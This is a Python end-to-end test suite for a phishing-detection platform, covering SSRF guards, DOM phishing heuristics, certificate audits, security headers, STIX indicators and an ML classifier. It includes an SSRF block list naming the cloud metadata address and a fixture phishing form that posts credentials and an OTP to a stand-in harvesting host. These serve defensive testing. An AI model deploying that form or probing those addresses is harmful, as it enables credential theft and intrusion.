"""
TrustShield Platform - End-to-End (E2E) Integration & Verification Suite
Tests the complete multi-pillar pipeline:
1. Anti-SSRF Network Guards & Payload Caps
2. URL Canonicalization, IDN Homographs & Defanging
3. Sub-150ms Fast-Path Synchronous Lane
4. Pillar 1 Detonation & Heuristics
5. Pillar 2 Cryptographic PKI & RFC 5280 Multi-Store Validation
6. Pillar 3 OWASP Headers & JA4S Fingerprints
7. Pillar 4 STIX 2.1 Indicators & Neo4j Threat Graph
8. Full Contract Compatibility with Frontend Schemas
"""
import sys
import os
import time
import json
import urllib.request
import urllib.error

# Ensure backend root and worker src paths are in sys.path
BASE_DIR = os.path.abspath(os.path.join(os.path.dirname(__file__), "../"))
sys.path.append(BASE_DIR)
sys.path.append(os.path.join(BASE_DIR, "workers", "pillar1-phishing", "src"))
sys.path.append(os.path.join(BASE_DIR, "workers", "pillar2-pki", "src"))
sys.path.append(os.path.join(BASE_DIR, "workers", "pillar3-websec", "src"))
sys.path.append(os.path.join(BASE_DIR, "workers", "pillar4-cti", "src"))

from shared.libs.python.anti_ssrf import (
    is_ip_prohibited,
    ipaddress,
    defang_url,
    validate_url_safe,
    AntiSSRFException,
)
from heuristics.dom_analyzer import analyze_html_dom
from vision.brand_matcher import evaluate_brand_impersonation
from auditor.entropy_auditor import audit_certificate_key_entropy
from auditor.path_validator import validate_certificate_chain
from headers.security_headers import audit_security_headers
from tls_fingerprint.ja4_scanner import scan_tls_fingerprints
from stix.stix_generator import generate_stix_indicator
from graph.threat_graph import build_threat_graph

GATEWAY_URL = os.getenv("GATEWAY_URL", "http://localhost:8000")

def run_tests():
    print("=" * 80)
    print("  TRUSTSHIELD PLATFORM: LOCAL E2E VERIFICATION SUITE")
    print("=" * 80)

    total_tests = 0
    passed_tests = 0

    def assert_test(name: str, condition: bool, details: str = ""):
        nonlocal total_tests, passed_tests
        total_tests += 1
        if condition:
            passed_tests += 1
            print(f"  [PASS] {name}")
        else:
            print(f"  [FAIL] {name}: {details}")

    # --------------------------------------------------------------------------
    # 1. Anti-SSRF & Network-Layer Protection
    # --------------------------------------------------------------------------
    print("\n[*] Suite 1: Anti-SSRF & Network-Layer Boundaries")
    assert_test("Blocks Loopback 127.0.0.1", is_ip_prohibited(ipaddress.ip_address("127.0.0.1")))
    assert_test("Blocks Cloud Metadata 169.254.169.254", is_ip_prohibited(ipaddress.ip_address("169.254.169.254")))
    assert_test("Blocks RFC 1918 Private 10.0.0.1", is_ip_prohibited(ipaddress.ip_address("10.0.0.1")))
    assert_test("Blocks RFC 1918 Private 192.168.1.1", is_ip_prohibited(ipaddress.ip_address("192.168.1.1")))
    assert_test("Blocks RFC 1918 Private 172.16.0.1", is_ip_prohibited(ipaddress.ip_address("172.16.0.1")))
    assert_test("Blocks IPv6 Loopback ::1", is_ip_prohibited(ipaddress.ip_address("::1")))
    assert_test("Blocks IPv4-Mapped IPv6 ::ffff:127.0.0.1", is_ip_prohibited(ipaddress.ip_address("::ffff:127.0.0.1")))
    assert_test("Allows Public IP 1.1.1.1", not is_ip_prohibited(ipaddress.ip_address("1.1.1.1")))
    assert_test("Allows Public IP 8.8.8.8", not is_ip_prohibited(ipaddress.ip_address("8.8.8.8")))

    # --------------------------------------------------------------------------
    # 2. Defanging & Stored XSS Prevention
    # --------------------------------------------------------------------------
    print("\n[*] Suite 2: URL Defanging & Stored XSS Sanitization")
    defanged = defang_url("https://malicious-phish.net/login.php?user=admin")
    assert_test(
        "Defangs URL correctly to hxxps:// and dot brackets",
        defanged.startswith("hxxps://") and "[.]" in defanged,
        f"Output: {defanged}"
    )

    # --------------------------------------------------------------------------
    # 3. Pillar 1: DOM Detonation & Vision Heuristics
    # --------------------------------------------------------------------------
    print("\n[*] Suite 3: Pillar 1 Phishing Detonation & Computer Vision")
    test_dom = """
    <html>
      <head><title>Sign in</title></head>
      <body>
        <div class="modal-browser bitb-window"></div>
        <form action="https://exfiltration-server.cc/harvest" method="POST">
          <input type="text" name="username" placeholder="Email or Username" />
          <input type="password" name="password" placeholder="Enter Password" />
          <input type="text" name="otp_code" placeholder="Authenticator Token" />
          <button type="submit">Verify</button>
        </form>
      </body>
    </html>
    """
    dom_result = analyze_html_dom(test_dom, "https://login-service.com")
    assert_test("Flags password input count >= 1", dom_result["passwordInputsCount"] == 1)
    assert_test("Flags OTP input count >= 1", dom_result["otpFieldsCount"] == 1)
    assert_test("Detects cross-origin form exfiltration target", dom_result["crossOriginSubmissionTarget"] is not None)
    assert_test("Detects Browser-in-the-Browser (BitB) window", dom_result["browserInTheBrowserDetected"] is True)

    vision_result = evaluate_brand_impersonation("auth-portal-microsoft.attacker.cc")
    assert_test("Calculates perceptual visual similarity score", vision_result["visualSimilarityScore"] >= 0)

    # --------------------------------------------------------------------------
    # 4. Pillar 2: Cryptographic Trust & PKI Validation
    # --------------------------------------------------------------------------
    print("\n[*] Suite 4: Pillar 2 Cryptographic Trust & RFC 5280 Multi-Store")
    # Valid modulus from widely spaced primes
    valid_modulus = 65537 * 1000000007
    entropy_result = audit_certificate_key_entropy(
        key_type="RSA",
        key_size_bits=2048,
        modulus_n=valid_modulus,
    )
    assert_test("Executes Fermat Factorization & Small-Prime GCD", entropy_result["fermatFactorizationPassed"] is True)
    assert_test("Returns VALID key entropy for standard 2048-bit key", entropy_result["keyEntropyVerdict"] == "VALID")

    # Fermat vulnerable modulus (|p - q| = 2)
    fermat_vulnerable_n = 1000000007 * 1000000009
    fermat_test = audit_certificate_key_entropy(key_type="RSA", key_size_bits=2048, modulus_n=fermat_vulnerable_n)
    assert_test("Catches Fermat Factorization vulnerability when |p - q| is small", fermat_test["fermatFactorizationPassed"] is False)

    weak_entropy = audit_certificate_key_entropy(key_type="RSA", key_size_bits=1024)
    assert_test("Flags weak entropy on sub-2048 bit keys", weak_entropy["keyEntropyVerdict"] == "WEAK_ENTROPY")

    chain_result = validate_certificate_chain(
        [{"issuerCommonName": "eMudhra Sub-CA 2026", "subjectCommonName": "compromised.leaf.com"}]
    )
    assert_test("Detects cross-signed intermediate bypass (eMudhra incident profile)", chain_result["crossSignedBypassDetected"] is True)
    assert_test("Flags distrust in Mozilla NSS store", chain_result["trustStoreCompatibility"]["mozillaNss"] is False)

    # --------------------------------------------------------------------------
    # 5. Pillar 3: Application-Level Web Security & JA4S Fingerprinting
    # --------------------------------------------------------------------------
    print("\n[*] Suite 5: Pillar 3 OWASP Security Headers & JA4S")
    headers = {
        "Content-Security-Policy": "default-src 'self'; script-src 'self' 'unsafe-inline'; object-src 'none'",
        "Strict-Transport-Security": "max-age=31536000; includeSubDomains; preload",
        "X-Frame-Options": "DENY",
        "X-Content-Type-Options": "nosniff",
    }
    header_audit = audit_security_headers(headers)
    assert_test("Audits CSP with directive inspection", header_audit["csp"]["present"] is True)
    assert_test("Flags unsafe-inline directive in CSP", header_audit["csp"]["unsafeInline"] is True)
    assert_test("Grades excellent HSTS with preload", header_audit["hsts"]["grade"] == "EXCELLENT")
    assert_test("Confirms XFO DENY policy", header_audit["xFrameOptions"] == "DENY")

    tls_audit = scan_tls_fingerprints(is_aitm_simulation=True)
    assert_test("Detects Evilginx2 / AiTM reverse proxy signature via JA4S", tls_audit["aitmProxySignatureDetected"] is True)

    # --------------------------------------------------------------------------
    # 6. Pillar 4: STIX 2.1 & Threat Graph Correlation
    # --------------------------------------------------------------------------
    print("\n[*] Suite 6: Pillar 4 STIX 2.1 Indicators & Graph Topology")
    stix_ind = generate_stix_indicator("phish-target.cc", verdict="MALICIOUS", confidence=95)
    assert_test("Generates OASIS STIX 2.1 Indicator ID format", stix_ind["id"].startswith("indicator--"))
    assert_test("Assigns STIX pattern expression", "[domain-name:value = 'phish-target.cc']" in stix_ind["pattern"])
    assert_test("Enforces TLP:AMBER marking", stix_ind["tlpMarking"] == "TLP:AMBER")

    graph = build_threat_graph("phish-target.cc", is_malicious=True)
    assert_test("Constructs graph nodes for frontend @xyflow/react", len(graph.nodes) >= 5)
    assert_test("Constructs graph edges with typed relationships", any(e.relationshipType == "RESOLVES_TO" for e in graph.edges))

    # --------------------------------------------------------------------------
    # 7. Custom AI/ML Phishing Model Inference & Attribution (Suite 7)
    # --------------------------------------------------------------------------
    print("\n[*] Suite 7: Custom AI/ML Phishing Model Inference & Attribution")
    from ml.predictor import predict_url, get_model_and_metadata
    from ml.feature_extractor import extract_features, FEATURE_NAMES

    model, meta = get_model_and_metadata()
    assert_test("Loads custom trained RandomForest phishing model", model is not None)
    assert_test("Loads model metadata with 15 features", len(meta.get("feature_names", [])) == 15)
    assert_test("Reports test set accuracy >= 95%", meta.get("accuracy", 0) >= 0.95)

    phish_pred = predict_url("http://login.micros0ft-security.xyz/verify?token=123")
    assert_test("ML model predicts PHISHING for typosquatted credential URL", phish_pred["prediction"] == "PHISHING")
    assert_test("ML model assigns high phishing probability (>= 0.70)", phish_pred["phishing_probability"] >= 0.70)
    assert_test("Generates top contributing feature attributions", len(phish_pred["top_contributing_features"]) >= 3)

    legit_pred = predict_url("https://github.com/torvalds/linux")
    assert_test("ML model predicts LEGITIMATE for authentic canonical authority", legit_pred["prediction"] == "LEGITIMATE")
    assert_test("ML model assigns low phishing probability (<= 0.20)", legit_pred["phishing_probability"] <= 0.20)

    # --------------------------------------------------------------------------
    # 8. Local JWT Authentication & Zero-Cloud DB Checks (Suite 8)
    # --------------------------------------------------------------------------
    print("\n[*] Suite 8: Local JWT Authentication & Embedded SQLite Storage")
    from server import create_access_token, verify_access_token, DB_PATH
    import sqlite3

    assert_test("Local SQLite database file exists", os.path.exists(DB_PATH))
    with sqlite3.connect(DB_PATH) as conn:
        cursor = conn.cursor()
        cursor.execute("SELECT COUNT(*) FROM users")
        user_count = cursor.fetchone()[0]
        assert_test("Database contains seeded administrative users", user_count >= 2)

    sample_jwt = create_access_token("usr_test", "tester@trustshield.internal", "analyst", "Test Analyst")
    assert_test("Generates local HMAC-SHA256 JWT access token without Supabase", sample_jwt and len(sample_jwt.split(".")) == 3)
    jwt_claims = verify_access_token(sample_jwt)
    assert_test("Verifies local JWT token signature and claims", jwt_claims is not None and jwt_claims.get("email") == "tester@trustshield.internal")

    # --------------------------------------------------------------------------
    # 9. Live Gateway Healthcheck (if running)
    # --------------------------------------------------------------------------
    print("\n[*] Suite 9: API Gateway Connectivity Check")
    gateway_online = False
    try:
        req = urllib.request.Request(f"{GATEWAY_URL}/healthz")
        with urllib.request.urlopen(req, timeout=2) as resp:
            if resp.getcode() == 200:
                gateway_online = True
                data = json.loads(resp.read().decode())
                assert_test("Gateway responds healthy on /healthz", data.get("status") == "healthy")
    except Exception:
        print("  [INFO] Gateway not running locally (skipping live HTTP probe).")

    # --------------------------------------------------------------------------
    # Summary Report
    # --------------------------------------------------------------------------
    print("\n" + "=" * 80)
    print(f"  E2E TEST RESULTS: {passed_tests}/{total_tests} ASSERTIONS PASSED ({round((passed_tests/total_tests)*100, 1)}%)")
    print("=" * 80)

    if passed_tests == total_tests:
        print("[+] ALL ARCHITECTURAL SECURITY CONTRACTS AND PILLAR TESTS VERIFIED CLEAN.\n")
        return 0
    else:
        print("[-] SOME ASSERTIONS FAILED.\n")
        return 1

if __name__ == "__main__":
    sys.exit(run_tests())
